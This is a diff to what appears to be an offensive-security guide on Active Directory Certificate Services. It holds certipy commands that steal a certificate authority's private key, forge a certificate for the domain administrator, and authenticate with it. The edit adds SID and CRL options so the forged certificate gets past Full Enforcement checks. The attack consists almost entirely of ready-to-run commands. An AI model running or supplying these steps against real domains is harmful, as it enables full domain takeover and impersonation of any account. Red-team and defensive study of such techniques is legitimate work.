@@ -19,8 +19,10 @@ Once you hold **local administrator on the CA server**, you can steal the CA's o
 # 1. Back up the CA certificate and private key (needs local admin on the CA host)
 certipy ca -backup -ca 'EXAMPLE-CA' -u user@example.local -p <password> -target ca.example.local
 
-# 2. Forge a certificate for any principal, signed by the stolen CA key, offline
-certipy forge -ca-pfx EXAMPLE-CA.pfx -upn administrator@example.local -out administrator_forged.pfx
+# 2. Forge a certificate for any principal, signed by the stolen CA key, offline.
+#    -sid gives the strong SID binding that Full Enforcement requires; -crl supplies a CDP the KDC wants
+certipy forge -ca-pfx EXAMPLE-CA.pfx -upn administrator@example.local \
+  -sid <administrator-SID> -crl 'ldap:///' -out administrator_forged.pfx
 
 # 3. Authenticate with the forged certificate
 certipy auth -pfx administrator_forged.pfx -dc-ip <dc>
